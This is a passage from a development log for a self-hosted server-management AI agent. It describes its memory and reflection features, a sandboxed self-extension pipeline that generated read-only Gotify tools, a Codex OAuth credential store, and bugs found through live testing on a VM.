  for (const item of parseRememberJson(result.text)) {
    if (!WRITABLE_CATEGORIES.has(item.category) || !item.key?.trim() || !item.value?.trim()) continue;
    memory.remember(db, item.category, item.key.trim().slice(0, 60), item.value.trim().slice(0, 500), "reflection");
  }
}
function parseRememberJson(text: string): { category: string; key: string; value: string }[] {
  try {
    const match = text.match(/\{[\s\S]*\}/);
    const obj = match ? JSON.parse(match[0]) : null;
    return Array.isArray(obj?.remember) ? obj.remember : [];
  } catch { return []; } // best-effort backstop - a parse failure is a silent no-op, not an error path
}
```
`allowedToolNames: []`, `maxTurns: 1` - cheapest possible shape (one completion, no tool
round-trip), matches "narrow investigation worker" almost verbatim already (`spawnWorker`'s
hardcoded system prompt isn't changed - cosmetic mismatch only, not worth touching `worker.ts` for).
The LLM never gets a mutating tool here - `dreaming.ts` (trusted code) parses and writes, keeping
the fire-and-forget background pass out of the DB-writing decision path directly.

**User-correction heuristic** - also in `dreaming.ts`:
```ts
const CORRECTION_PATTERNS = [/^no[,.]?\b/i, /\bnot what i (asked|meant|wanted)\b/i, /\bthat'?s (not|wrong)\b/i, /\bi meant\b/i, /\bactually[, ]/i, /\bdon'?t do that\b/i];
// ponytail: naive keyword/regex heuristic, no real NLU - upgrade to a real classifier if false-positive rate matters.
export function isLikelyCorrection(text: string): boolean {
  return CORRECTION_PATTERNS.some((re) => re.test(text.trim()));
}
```

**Wiring in `index.ts`** - module-level (not per-connection, since `models`/`getStoredKey` are
already module-scoped):
```ts
function reflect(trigger: ReflectionTrigger): void {
  const model = pickDefaultModel(models, getStoredKey, "cheapest"); // background pass never spends the user's "best" budget
  if (model) reflectOnOperation(db, model, getStoredKey, trigger).catch((err) => console.error("[mirod] reflection failed", err));
}
```
passed as `reflect` in each connection's `OperationToolContext`. In `handleChat`, before processing
a new message:
```ts
if (state.lastReply && isLikelyCorrection(text)) {
  const model = pickDefaultModel(models, getStoredKey, "cheapest");
  if (model) reflectOnCorrection(db, model, getStoredKey, state.lastReply, text).catch((err) => console.error("[mirod] reflection failed", err));
}
```
not awaited, doesn't add latency to the real turn. `state.lastReply = reply;` set after the turn
completes. `ConnState` gains `lastReply?: string`.

#### 6. `/memory` command

No new `ServerEvent` - reuses the existing `ReplyEvent`, exactly like `/pair` already does (plain
text back, no dedicated UI). Two new `ClientMessage` variants in `packages/protocol/src/index.ts`:
```ts
export interface MemoryListMessage { type: "memory_list"; }
export interface MemoryForgetMessage { type: "memory_forget"; id: string; }
export type ClientMessage = ChatMessage | AnswerMessage | ProviderSetupMessage | PairRequestMessage | MemoryListMessage | MemoryForgetMessage;
```
`index.ts`'s message switch:
```ts
} else if (msg.type === "memory_list") {
  send({ type: "reply", text: memory.formatForDisplay(memory.listAll(db, 50)) });
} else if (msg.type === "memory_forget") {
  const changed = memory.forget(db, msg.id);
  send({ type: "reply", text: changed > 0 ? "Forgotten." : "Nothing matched that id." });
}
```
`memory.forget(db, idOrPrefix)` does `DELETE FROM memories WHERE id = ? OR id LIKE ?` - display
shows an 8-char id prefix (full UUIDs are unwieldy to type in a TUI), and `forget` prefix-matches so
the short id works.

`formatForDisplay` groups by category (only categories with rows print a header - empty ones are
silently absent, no special-casing needed), ordered `occurrence_count DESC, last_seen_at DESC`
within each group, using `confidenceLabel` (not raw counts) for consistency with the summary's
verbal framing:
```
Preferences:
  a3f9c1d2  reply_style - prefers short, direct replies (confirmed)
Server facts:
  91bb02ee  postgres runs on port 5433, not the default (noted a few times)
Incidents:
  c7710a41  restart jellyfin.service - rolledback: verification failed (tentative)

/memory forget <id> to remove one.
```

**"Editable" concretely means delete-only** in this slice - no value-editing UI. Correcting a wrong
memory means forgetting it and letting either `memory.remember` or the reflection pass re-derive it.
Real inline editing isn't needed here (occurrence-count reinforcement already handles "refine over
time" for the common case), so it's cut rather than built speculatively.

`apps/miro/src/App.tsx`'s onSubmit gets two more branches in the existing flat if/else-if chain:
```tsx
} else if (text.trim() === "/memory") {
  send({ type: "memory_list" });
} else if (text.trim().startsWith("/memory forget ")) {
  send({ type: "memory_forget", id: text.trim().slice("/memory forget ".length).trim() });
}
```

#### 7. Communication-style adaptation

**No new category** - `preference` with a **reserved, conventional key**, `"reply_style"`. This
gives it a dedicated point-lookup read path separate from (in addition to) the general top-8 summary
injection:
```ts
export function systemPrompt(personality: Personality, learnedStyle: string | null = null, memorySummary = ""): string {
  const tone = learnedStyle ? `${PERSONALITY_TONE[personality]} Also: ${learnedStyle}` : PERSONALITY_TONE[personality];
  return `${BASE_SYSTEM_PROMPT}\n${tone}${memorySummary ? `\n\n${memorySummary}` : ""}`;
}
```
`createMiroAgent` does `const learnedStyle = operationCtx ? memory.getByKey(operationCtx.db,
"preference", "reply_style")?.value ?? null : null;` and passes it through. Written via the same two
mechanisms as everything else: the model can call `memory.remember({category:"preference",
key:"reply_style", value:"..."})` directly when a user states a style preference (the tool's own
description nudges the model toward this exact key), or the reflection pass picks it up off a
user-correction event ("that was too long-winded" → `reply_style`). Both paths reinforce the same
row via the existing upsert, so `confidenceLabel` naturally strengthens it over repeated mentions -
no separate mechanism needed.

#### 8. File-by-file plan

**New files:**
| File | Purpose |
|---|---|
| `apps/mirod/src/memory/store.ts` | schema, CRUD, `confidenceLabel`, `buildSummary`, `recordIncident`, `formatForDisplay` |
| `apps/mirod/src/memory/store.test.ts` | real `bun:sqlite`, mirrors `operations/store.test.ts` |
| `apps/mirod/src/memory/dreaming.ts` | `reflectOnOperation`, `reflectOnCorrection`, `isLikelyCorrection`, `parseRememberJson` |
| `apps/mirod/src/memory/dreaming.test.ts` | tests the pure parts only (`parseRememberJson`, `isLikelyCorrection`) - the LLM call itself isn't unit-tested for the same reason `worker.test.ts` doesn't test `spawnWorker`'s real streaming (it hardcodes `builtinModels()` internally, needs a real key); this is an existing, established boundary, not a new gap |
| `apps/mirod/src/agent/memory-tools.ts` | `buildMemoryTools(db)` → `memory.remember`, `memory.query` |

No dedicated `memory-tools.test.ts` - `operation-tools.ts` has none either (thin wrapper over
already-tested `store.ts` logic); same precedent applied here.

**Modified files:**
| File | Change |
|---|---|
| `apps/mirod/src/operations/store.ts` | add `countByKindAndPhase(db, kind, phase)` |
| `apps/mirod/src/operations/engine.ts` | `OperationToolContext.reflect?`, `ReflectionTrigger` export, `onTerminal` closure + `REPEAT_FAILURE_THRESHOLD`, mechanical calls at 3 of `runOperation`'s 4 exit points, mechanical calls in `reconcileOperations`'s 2 real terminal transitions |
| `apps/mirod/src/operations/engine.test.ts` | `freshDb()` also calls `ensureMemoryTable`; new tests for mechanical writes, threshold-gated `reflect`, exclusion on cancel |
| `apps/mirod/src/agent/index.ts` | `systemPrompt(personality, learnedStyle?, memorySummary?)`; `createMiroAgent` computes both from `operationCtx.db`, wires `buildMemoryTools` |
| `apps/mirod/src/agent/index.test.ts` | update `systemPrompt("casual")` call sites if signature check matters (defaults keep old calls valid) |
| `apps/mirod/src/index.ts` | `ensureMemoryTable(db)` at boot; module-level `reflect(trigger)`; `ConnState.lastReply`/`lastMemorySummary`; correction-heuristic check in `handleChat`; summary-staleness check added to the existing model-id rebuild condition; `memory_list`/`memory_forget` branches |
| `packages/protocol/src/index.ts` | `MemoryListMessage`, `MemoryForgetMessage` added to `ClientMessage` |
| `apps/miro/src/App.tsx` | `/memory` and `/memory forget <id>` branches |

**Explicitly out of scope this slice** (stated, not silent): value-editing in `/memory` (delete-only),
reflection on crash-reconciled operations, a time window on repeated-incident counting,
quiet-competence personalization, app_knowledge/extension_knowledge/research write paths, and
self-extension (§32-35) - this design imports nothing from a future self-extension module and adds
no hooks that would need to change for it to land later.

### Implemented exactly as designed above

Every file in the file-by-file plan was built as specified: `apps/mirod/src/memory/store.ts`
(+`.test.ts`, 11 tests), `apps/mirod/src/memory/dreaming.ts` (+`.test.ts`, 5 tests - the pure parts
only, `parseRememberJson`/`isLikelyCorrection`), `apps/mirod/src/agent/memory-tools.ts`,
`operations/store.ts`'s `countByKindAndPhase`, `operations/engine.ts`'s `onTerminal`/
`REPEAT_FAILURE_THRESHOLD`/`ReflectionTrigger` (+8 new tests in `engine.test.ts` - mechanical
writes, threshold-gated reflect on both `runOperation` and `reconcileOperations`, cancellation
exclusion), `agent/index.ts`'s `systemPrompt`/`createMiroAgent` wiring (+3 new deterministic
composition tests), `index.ts`'s full wiring (boot-time table, module-level `reflect`, correction
heuristic, summary-staleness agent rebuild, `/memory` protocol branches), protocol additions,
`App.tsx`'s `/memory` commands. 100/100 tests pass, `tsc --noEmit` clean across all three packages
(mirod, miro, protocol).

### Two real bugs found and fixed via live verification (not caught by unit tests or typecheck)

Per this project's standing discipline, this slice was live-verified on the QEMU dev VM against a
real running daemon and a real tool-calling model (Ollama, tunneled from this Mac exactly as in
Stage B's live test) - not just unit-tested. That live run surfaced two real bugs neither `bun test`
nor `tsc --noEmit` could have caught, because both are about runtime behavior against real external
systems (a real model's tool-calling, a dynamically-registered provider registry), not pure logic:

1. **`memory.remember`'s TypeBox schema used `Type.Union([Type.Literal(...)])` for the `category`
   enum** (matching `agent/tools.ts`'s pre-existing `fsQueryParams.class` pattern) - this compiles to
   JSON Schema `"anyOf":[{"const":"preference"},...]`. Live-tested against Ollama's `gemma4:31b-cloud`:
   the model tried to call the tool 3 times, failed validation each time on the category field, then
   gave up and answered in natural language instead ("I'm having some trouble with the category field
   in my memory tool"). Direct isolated testing (calling `execute()` directly, bypassing the model)
   proved the tool implementation itself was correct - the bug was specifically in how that
   `anyOf`-of-`const` shape reads to this model's function-calling. **Fixed** in
   `agent/memory-tools.ts` by switching to `Type.Unsafe({ type: "string", enum: [...] })`, which
   compiles to plain JSON Schema `"enum":[...]` - the far more universally-supported function-calling
   shape. Re-tested live: the model called the tool correctly on the first try. **Scope note:** this
   fix was applied only to the new `memory-tools.ts` file, not retroactively to `agent/tools.ts`'s
   pre-existing `fsQueryParams` (same `Type.Union`-of-`Type.Literal` pattern, never live-tested with a
   real model as far as this session found) - that's a latent, pre-existing, out-of-scope-for-this-
   slice risk worth flagging for whenever `filesystem.query` gets its own live model test.
2. **`agent/worker.ts`'s `spawnWorker` built its own fresh `builtinModels()` internally**, rather than
   taking the caller's own registry. This meant any provider registered dynamically onto the caller's
   registry after `builtinModels()` was first called - specifically `registerOllamaIfReachable`,
   called once at `index.ts` startup - was invisible to `spawnWorker`'s independent registry. Every
   call to `spawnWorker` with an Ollama-backed model failed with `"Unknown provider: ollama"`. This
   bug **pre-dates this slice** (it was latent in `worker.ts` since Stage 0/1) but was only exposed
   now because Dreaming's reflection pass is the first real production caller of `spawnWorker` -
   `worker.test.ts` never actually invokes `spawnWorker` itself (it reimplements the Agent-building
   logic directly to avoid needing a real key), so nothing had ever exercised this path live before.
   **Fixed** by changing `spawnWorker`'s signature to accept `models: ReturnType<typeof
   builtinModels>` as a parameter instead of constructing one internally, threading the daemon's one
   shared registry through from both `index.ts` call sites (`reflect()` and the correction-heuristic
   branch in `handleChat`) via `memory/dreaming.ts`'s `reflectOnOperation`/`reflectOnCorrection`. Only
   one real caller existed (`dreaming.ts`) so the blast radius of the signature change was minimal.
   Re-tested live: reflection calls against Ollama-backed models now complete successfully.

### Live-verification narrative (QEMU VM, real systemd, real Ollama, real tool-calling model)

Same methodology as Stage B slice 1: synced current source to the VM (tarball over scp - no rsync
available on this Mac), `bun install`, ran `mirod` natively on the VM with Ollama tunneled in from
this Mac (`ssh -R 11434:localhost:11434`), drove a real multi-turn conversation over the local unix
socket (the still-flaky Iroh relay path wasn't used for this test, consistent with Stage A's open
finding). Cleaned `~/.miro/miro.db` before each run for a deterministic starting state.

**Real, independently-observable results** (via the `/memory` protocol path, not the model's own
self-report):
- Two genuinely distinct `systemctl restart` failures (real command, real
  `Unit ... not found.` error from real systemd, against two different fake unit names so the model
  couldn't reasonably skip re-attempting a call it already knew would fail) → two separate mechanical
  incident rows, each correctly `(tentative)` since they're different `(category, key)` pairs. A
  same-unit repeat (tested in an earlier run of this same VM) correctly reinforced to
  `occurrence_count 2` / `(noted a few times)` on the *same* row instead of duplicating.
- `memory.remember`, once the schema bug was fixed, worked reliably in a single tool call -
  "The user likes terse replies." stored and visible in `/memory` under Preferences.
- The user-correction heuristic (`isLikelyCorrection`) correctly matched a real chat message
  ("no, that's way too long, just give me the short version next time") and fired
  `reflectOnCorrection` in the background. After a 20s settle wait, `/memory` showed a **new**
  preference row - "The user prefers extremely concise, short versions of responses." - written by
  the real LLM reflection call (source `reflection`), proving the full pipeline (heuristic trigger →
  `spawnWorker` → real Ollama completion → `parseRememberJson` → `memory.remember`) end to end inside
  the actual live daemon's fire-and-forget path, not just in an isolated test script.
- The threshold-gated `reflectOnOperation` path (2 repeated `systemd.restart` rollbacks) was
  confirmed to fire and complete without error (no `"[mirod] reflection failed"` in the daemon log),
  but the model judged the fabricated nonexistent-unit scenario as not worth remembering as a durable
  fact - a defensible model judgment call, not a bug. This exact "correctly decides not to write
  anything" outcome was also reproduced in an isolated direct test (bypassing the live daemon),
  confirming it's consistent model behavior rather than a flaky one-off. The mechanism firing
  correctly at the right threshold is separately proven deterministically by
  `engine.test.ts`'s unit tests (which don't depend on real model judgment).
- The always-on summary / `learnedStyle` injection (`agent/index.ts`'s `systemPrompt` composition)
  is proven deterministically by 3 new unit tests (string composition, no live model needed for
  correctness there) plus indirectly by the live run's later turns behaving consistently with a
  populated preference existing - full live observation of the injected system prompt itself wasn't
  attempted (would require instrumenting the daemon to print its own prompt, judged not worth the
  extra step given the deterministic test coverage already proves the composition logic exactly).

**Deferred/not attempted this slice, stated explicitly:** live-testing `/memory forget`
(deterministically covered by `store.test.ts`'s `forget` unit test instead); observing the
mechanical write path through `reconcileOperations` live (covered deterministically by
`engine.test.ts`, and would require deliberately crashing the daemon mid-operation on the VM, judged
not worth the extra live-test time given Stage B slice 1 already live-proved `reconcileOperations`'s
core mechanics generally).

---

## Part 4 - Shipped: Self-extension (§32-35), Phase 1 (Stage C slice 2)

### Why this is next

Stage C slice 1 (Memory + Dreaming's reflection half) explicitly deferred the Voyager-shaped
self-extension skill library as "a much bigger, riskier, separate system." This is that slice: the
agent identifying an unfamiliar self-hosted app, researching it, generating a local extension,
validating it, wiring it into the live agent's tool set, and (Phase 2, not yet built) later
detecting and repairing that extension when the target app changes.

### Grilled decisions (confirmed by the user, fixed going in)

1. Browser automation in scope this slice (not deferred) - a minimal tool set, kept out of the
   main chat agent's tool list.
2. Extension isolation: a separate OS process now (reusing `@miro/protocol`'s `encodeLine`/
   `createLineBuffer` JSON-line framing over a new daemon↔extension-host boundary), real OS-level
   sandboxing (uid/gid drop, seccomp) explicitly deferred with a named upgrade path.
3. Codegen model tier user-configurable, asked once at setup, defaulting to `best` (not
   `routing_policy`'s default) - later superseded in practice by decision-during-implementation #7
   below (Codex, when connected, always wins).
4. Full validation pipeline: TypeScript check + AST-based forbidden-import allowlist scan (a real
   security boundary, not regex) + generated tests must pass + a real read-only live probe.
   Extension tools are read-only only this slice.
5. Gotify (single static Go binary, real REST API + its own web UI) as the live-verification
   target, run via a bare systemd unit on the QEMU VM - same zero-Docker pattern as
   `miro-demo.service`.
6. Dreaming's self-repair half included in this slice's scope (Phase 2), not deferred to a later
   slice - though Phase 2 itself is not yet built (see "Not yet built" below).

### Two research findings that shaped the design

**Playwright does not reliably work under Bun's own runtime** (multiple open/closed-not-planned Bun
and Playwright GitHub issues confirm `chromium.launch()` hangs/times out under native `bun run` -
online "it works" claims are all about Bun as a package-manager/test-runner shim around Playwright's
Node-targeted harness, not `bun run` driving the launcher directly). **Bun 1.3.12+ ships
`Bun.WebView`**, a built-in headless-browser automation API - confirmed present and working exactly
as documented in this project's installed Bun 1.4.0, live-verified on the real dev VM (real
Chromium launch, `navigate`/`evaluate` both work, including returning structured objects) before
anything was built on top of it. Bun's own docs call this API "experimental and may change in
future releases," it has no accessibility-tree API (worked around with a hand-written DOM-walking
`SNAPSHOT_JS` that tags every element with a `data-miro-ref` marker attribute so later `click`/
`fill`/`read` calls can reliably re-select it), and it requires a real Chrome/Chromium binary
installed on every server Miro manages - a new external-binary dependency this project hadn't had
before. Given Playwright is confirmed non-viable and no mature alternative exists under Bun today,
this was the right call, live-proven correct.

**Gotify confirmed**: single static Go binary (including `linux-arm64`), not in Debian's apt repo
(downloaded from GitHub releases, `v3.1.0`), documented REST API (`/health`, `/version`, `/message`,
`/application`, `/client`, auth via `X-Gotify-Key`/`Authorization: Bearer`/`?token=`), and it has its
own web admin UI - exercises both the "has docs" codegen path and the browser-tools path in one
target.

### Architecture

**Extension storage**: `~/.miro/extensions/<app>/` (manifest + up to 4 generated files:
`tools.ts`/`diagnostics.ts`/`browser.ts`/`tests.ts`) - outside the repo tree, deliberately, since
this project's live-verification workflow does `rm -rf apps && tar xzf ...` on every VM resync,
which would silently delete anything generated under `apps/mirod/`. `<app>.staging/` during
generation, `<app>.prev/` as the one-deep rollback copy (`apps/mirod/src/extensions/paths.ts`). A
`node_modules` symlink into `apps/mirod/node_modules` is maintained per extension directory
(recreated defensively at boot, and on every staging write) so generated code's
`import ... from "@miro/sdk"` resolves despite living outside any workspace glob.

**Extension-host subprocess + RPC** (`extensions/host-protocol.ts`, `host-entry.ts`, `host.ts`): a
new, deliberately *not client-facing* protocol (unlike `packages/protocol`, nothing remote ever
touches this boundary) reusing `@miro/protocol`'s generic `encodeLine`/`createLineBuffer` framing
over `Bun.spawn`'s stdio pipes. Three init modes: `init` (real runtime use), `learn_init`
(browser-only capability during learning/repair - no generated code loaded, since none exists yet),
`test_init` (runs generated `tests.ts` against a fake HTTP client). Lifecycle: spawn-on-demand, one
process per app, idle-reaped after 5min via a periodic interval (`setInterval(() =>
hostMgr.reapIdle(), 60_000)` in `index.ts`). Scrubbed env (`PATH`/`HOME` only - never the daemon's
full env, which can carry provider API keys). **Isolation ceiling, explicit and unchanged from the
grilled decision**: process-boundary isolation only - no uid/gid drop, no seccomp/landlock yet.
`host-entry.ts` itself (fixed, hand-written, never generated) has no import path to
`bun:sqlite`/`secrets.ts`/`operations/engine.ts` at all, structurally, regardless of what generated
code tries - that plus the forbidden-import allowlist scan on the *generated* files is the real
belt-and-suspenders.

**`@miro/sdk`** - new `packages/sdk` workspace package (same minimal shape as `@miro/protocol`):
`HttpClient` (`get()` only - no `post`/`put`/`delete`, structurally enforcing read-only this slice),
`createHttpClient`/`createFakeHttpClient` (fixture-based, for `tests.ts`), `BrowserSession`
(open/snapshot/find/click/fill/select/read/wait/close - implemented only inside `host-entry.ts`,
since only that process has `Bun.WebView`), `ExtensionTool`/`ExtensionContext`, re-exports
`Type`/`Static` from `@earendil-works/pi-ai` (the schema convention every tool file already uses).

**Browser tools** (8, built on `Bun.WebView`, run inside the extension-host process): `browser_open`,
`browser_snapshot` (the hand-written DOM walker), `browser_find` (same walker, filtered),
`browser_click`, `browser_fill` (click + `type`), `browser_select` (no native `<select>` API -
`evaluate()` sets `.value` + dispatches `change`/`input`; flagged limitation: plain `<select>` only,
not custom JS dropdowns), `browser_read` (also the verification mechanism), `browser_wait` (manual
poll loop, no native wait). Bridged to the learning agent as normal tools; never added to
`agent/tools.ts`'s `AGENT_TOOLS`.

**Learning orchestration**: one implementation, two entry points - `app_learn` tool
(`agent/learn-tools.ts`, visible to the main chat agent) and `/learn <app>` slash command (new
`LearnRequestMessage` in `packages/protocol` - this one *is* client-facing). Both call
`extensions/learn.ts`'s `runLearnFlow` → `extensions/learn-agent.ts`'s `spawnLearningAgent` (a new,
bigger-budget tool-calling agent - not a reuse of `spawnWorker`, which is too narrow/short-budgeted
for real research+codegen), tools: `web_search` (reused from `AGENT_TOOLS`) + the 8 browser tools +
`http_probe` (trusted `fetch()` wrapper) + `secret_store` (writes via existing `secrets.ts`,
namespace bound by closure to `extension.<app>.*` - the model can't write outside it) +
`extension_write` (the actual codegen act - one structured tool call with the 4 file bodies as
string params, not free-text code-fence parsing, bounded to 3 attempts per learning session via an
in-memory counter). `extension_write`'s `execute()` writes to staging, mechanically extracts each
tool's real schema via the host's `list_tools` RPC (never asks the model to hand-type JSON Schema -
the direct lesson from Stage C slice 1's live-found `Type.Union`-of-`Literal` schema bug: one
source of truth, derived, never hand-duplicated), runs full validation, and promotes inline on
success.

**Manifest + validation pipeline**: `ExtensionManifest` (app, displayName, baseUrl, declared
`SecretRef`s, mechanically-derived tool/diagnostic specs, version). Static checks (TS compiler API
in-process against `tools.ts`/`diagnostics.ts`/`browser.ts`/`tests.ts` together, so cross-file
imports resolve; `typescript` promoted from a root-only devDependency to a real `apps/mirod`
dependency since `validate.ts` needs the compiler API at daemon runtime; AST-based **allowlist**
scan - only `@miro/sdk` + same-directory relative imports permitted) run in the main daemon
process. Execution checks (`tests.ts` against a fake HTTP client; a real read-only live probe
against no-arg diagnostic tools) run inside the extension-host subprocess, under the same isolation
boundary they'll actually run under. Live-verified: `ts.createProgram()` genuinely takes 3-6s on
the constrained ARM64 dev VM - not a bug, but a real characteristic of every `extension_write` call
worth knowing about.

**Tool-wiring adapter** (`agent/extension-tools.ts`): reads enabled extensions from a new
`extensions` table (plain `bun:sqlite`, matching `operations/store.ts`'s convention - state,
manifest, version, `consecutive_failures`/`repair_attempts` counters for the not-yet-built repair
loop), namespaces each tool as `ext_<app>_<name>` (sanitized - see the tool-naming section below),
wired into `createMiroAgent` alongside operation/memory tools. `ConnState` gains
`lastExtensionVersion` (a hash of enabled `(app,version)` pairs), triggering an agent rebuild on
change - same mechanism already used for `lastMemorySummary`, live-verified: a promoted extension's
tools became callable from the main chat agent on the very next turn, no daemon restart.

### Real bugs found and fixed via live testing (not caught by unit tests or typecheck)

Same discipline as every prior stage - live verification against real infrastructure kept finding
things pure-logic testing structurally cannot see:

1. **A relative `import()` inside `host-entry.ts` resolved against the *importing module's own
   location*, not the subprocess's `cwd`** - classic ESM gotcha (`cwd` only affects
   `process.cwd()` calls and Node-style path resolution, never `import()` resolution). Found live
   via an isolated RPC smoke test: `"Cannot find module './tools.ts'"`. Fixed by routing the
   specifier through a non-literal `string` parameter (`importGenerated(relativePath)`, which also
   incidentally opts TypeScript out of trying to statically resolve a file that doesn't exist in
   the source tree) and building an absolute path from `process.cwd()` (which Bun.spawn's `cwd`
   *does* correctly set).
2. **The daemon would hang forever if the extension-host subprocess failed during init or died
   mid-request** - nothing raced the pending promise against the process actually exiting. Found
   live via the same RPC smoke test (a fixed init-time error left the daemon-side `await
   waitReady()` waiting on a `"ready"` that would never arrive). Fixed two ways: `host-entry.ts`
   now calls `process.exit(1)` on any init-time error (it can't usefully continue anyway), and
   `host.ts`'s `waitReady()`/`request()` both now `Promise.race` against `session.proc.exited`,
   rejecting promptly with a real error instead of hanging.
3. **A reintroduced circular import** - `extensions/learn-agent.ts` imported `resolveApiKey`/
   `runTurn` from `"../agent/index"` instead of the leaf `agent/model-utils.ts`, recreating exactly
   the cycle (`agent/index.ts` → `agent/learn-tools.ts` → `extensions/learn.ts` →
   `extensions/learn-agent.ts` → `agent/index.ts`) that `model-utils.ts` was extracted to avoid.
   It "worked" via ESM's lazy live-binding resolution (tsc and tests both passed), which is fragile
   luck, not a fix - corrected to import from `model-utils.ts` directly.
4. **`JSON.stringify(undefined)` returns the *value* `undefined`, not a string** - a widespread
   latent bug in every `textResult()`-style helper across the codebase (`agent/tools.ts`,
   `memory-tools.ts`, `operation-tools.ts`, `extension-tools.ts`, `extensions/learn-agent.ts` - 5
   files, identical pattern). Every tool in the project before this slice always returned a real
   value, so it never surfaced; `browser_open` is the first `Promise<void>`-returning tool in the
   codebase, and its `undefined` result produced a malformed `{text: undefined}` block that crashed
   deep inside pi-agent-core (`"undefined is not an object (evaluating 'block.text.length')"`).
   Fixed at the root in all 5 files: `JSON.stringify(details ?? null, null, 2)`.
5. **Every tool name in the entire codebase used dots as a namespace separator**
   (`web.search`, `container.list`, `memory.remember`, `service.restart`, ... - every tool built in
   Stages 1/2/B/C-1 and this slice) - **OpenAI's Responses API (used by the Codex provider) rejects
   any tool name outside `^[a-zA-Z0-9_-]+$`.** Ollama's more lenient OpenAI-completions-compatible
   endpoint never caught this; it only surfaced once a genuinely strict provider (Codex) was used
   for the first time. This was a project-wide fix, not scoped to self-extension: every literal
   tool name across `agent/tools.ts` (12), `agent/learn-tools.ts`, `agent/memory-tools.ts` (2),
   `agent/operation-tools.ts`, `extensions/learn-agent.ts` (11), plus the dynamically-constructed
   `ext_<app>_<name>` in `agent/extension-tools.ts`, plus `host-entry.ts`'s matching RPC dispatch
   switch, renamed dot→underscore. Enumerated exhaustively via a dedicated Explore pass first (to
   avoid missing one) before the mechanical rename. Since `manifest.app`/`spec.name` for a promoted
   extension come from *generated* code (not this repo's own literals), `agent/extension-tools.ts`
   also gained a defensive `sanitizeNamePart()` (replaces anything outside the allowed character
   set with `_`) as a structural backstop beyond just asking the learning agent's system prompt to
   use clean names. A new `agent/tool-names.test.ts` now asserts every static tool-name list
   matches the pattern, so this class of bug fails a test immediately instead of surfacing as a
   live 400 against one specific provider next time.

### OpenAI Codex (ChatGPT OAuth) integration - added mid-slice, not in the original grilled scope

Added because the Ollama cloud models' shared usage quota proved too volatile to reliably complete
a 20+ turn live-verification run (repeatedly reset briefly then exhausted on the very next real
request - not a hard monthly cap, a much tighter rate limit than expected). `@earendil-works/pi-ai`
already ships a full `openai-codex` provider (including `gpt-5.6-luna`, the model this session
confirmed as the user's standing preference) with a real OAuth flow
(`dist/auth/oauth/openai-codex.js`) and its own CLI (`bin: {"pi-ai": "dist/cli.js"}`, `login
openai-codex`, device-code flow for headless use) - no library code needed writing, only the
storage/wiring layer pi-ai's own `Models.getAuth()` contract expects:

- **`apps/mirod/src/agent/codex-auth.ts`** (new) - `createCodexCredentialStore(db, secretStore)`
  implements pi-ai's `CredentialStore` interface (`read`/`list`/`modify`/`delete`) backed by the
  existing encrypted `secrets.ts` store (one JSON blob per provider, ref `"oauth.<providerId>"`),
  with a simple per-provider promise-chain lock (single-process daemon, no cross-process concern).
  `Models.getAuth()` runs OAuth refresh *inside* `modify()` under this store's lock, so a rotated
  access token is always persisted back - the daemon stays logged in across restarts.
  `importCodexCredentialFromCli()` is a one-time import of a credential written by pi-ai's own CLI
  login (read from a well-known drop file, `~/.miro/codex-auth-import.json`, imported once at boot
  and the file deleted) - deliberately not a full interactive OAuth login UX in the daemon/TUI
  itself yet (out of scope for what was needed here; the CLI's own device-code flow already covers
  the login step).
- **`index.ts`**: `builtinModels({ credentials: codexCredentials })` - `builtinModels()` already
  registers the `openai-codex` provider and its model catalog by default; the only missing piece
  was somewhere durable for it to store/refresh credentials.
- **Confirmed standing preference: when a Codex credential is connected, codegen ALWAYS uses it -
  `gpt-5.6-luna` at `reasoning: "medium"` - regardless of the general `codegen_policy` tier
  setting**, which now only matters as a fallback when Codex isn't connected.
  `extensions/learn.ts`'s `CodegenSelection` (`{model, reasoning?}`) carries this through
  `runLearnFlow` → `spawnLearningAgent`, which merges `reasoning` into every `streamFn` call when
  set. `index.ts`'s `resolveCodegenModel` checks `codexCredentials.read("openai-codex")` first,
  before ever asking the `codegen_policy` onboarding question - live-verified: once Codex was
  imported, the question genuinely stopped being asked.
- Live-verified in isolation before the full flow: a direct `Agent`+`runTurn` call against
  `getBuiltinModel("openai-codex", "gpt-5.6-luna")` with `reasoning: "medium"` and the imported
  credential returned a real completion ("pong") - proving the credential store, refresh contract,
  and model resolution all work before spending a 5-minute live-test cycle on it.

### Live-verification narrative - the real end-to-end proof

Gotify + `chromium` added to the VM's cloud-init (`tools/dev-vm/cloud-init/user-data.yaml`) for
future reproducibility; the actual live session installed both directly on the running VM first
(faster iteration) then backfilled cloud-init. Source resynced via the established tar+scp
workflow (no rsync on this Mac; `._*` AppleDouble cleanup; `bun install --force` needed whenever a
resync touches `apps/`, since `rm -rf apps` deletes the nested workspace `node_modules` symlinks
too). `mirod` run natively on the VM, Ollama tunneled in from this Mac
(`ssh -R 11434:localhost:11434`) for the fallback/other-model testing along the way.

**`/learn gotify` completed the full loop for real**, driven over the local unix socket: identified
Gotify 3.1.0 correctly, found the real spec.json URL and local `/docs`, correctly distinguished
public GET endpoints (`/version`, `/health`, `/gotifyinfo`) from protected ones needing auth
(`/message`, `/application`, `/client`, `/user`) it correctly declined to guess credentials for,
called `extension_write` twice (first attempt likely hit a validation failure the model then
fixed), and reported a promoted extension with 3 tools + 2 diagnostics, all GET-only.

**Independently verified, not just the model's self-report:**
- Real files on disk at `~/.miro/extensions/gotify/`: `manifest`, `tools.ts` (3 tools:
  `get_version`/`get_health`/`get_gotify_info`, each a clean `ctx.http.get(path)` call, correct
  underscore-only names - the model followed the naming instruction), `diagnostics.ts` (2 checks),
  `tests.ts`, plus the `node_modules` symlink.
- `manifest`'s `tools`/`diagnostics` schemas exactly match what `tools.ts`/`diagnostics.ts`
  actually export - confirming the mechanical schema-extraction (not model-authored) path worked.
- Real `extensions` table row: `{app: "gotify", state: "enabled", version: 1,
  consecutive_failures: 0, repair_attempts: 0, base_url: "http://localhost:8080"}`.
- **The strongest check**: a fresh real chat turn ("Use your gotify tool to get the exact version
  info") against the *main* chat agent (not the learning agent) correctly called the newly-wired
  `ext_gotify_get_version` tool and returned `{version: "3.1.0", commit:
  "14bfc256276775c425f988d621dccfe705de18ac", buildDate: "2026-08-27-16:47:47"}` -
  byte-for-byte identical to a raw `curl http://localhost:8080/version` run independently over a
  separate SSH session. Proves the whole chain for real: generated code → mechanical manifest →
  `extensions` table → `buildExtensionTools` → live agent tool list → real HTTP call → real
  correct data back to the user.

### Phase 2 - Shipped and live-verified: the Dreaming repair loop

Built immediately after Phase 1's live proof, per the plan's own sequencing rule ("build and
live-verify Phase 1 against Gotify's happy path first, before writing any of Phase 2" - repair
structurally depends on generation/validation already working for real).

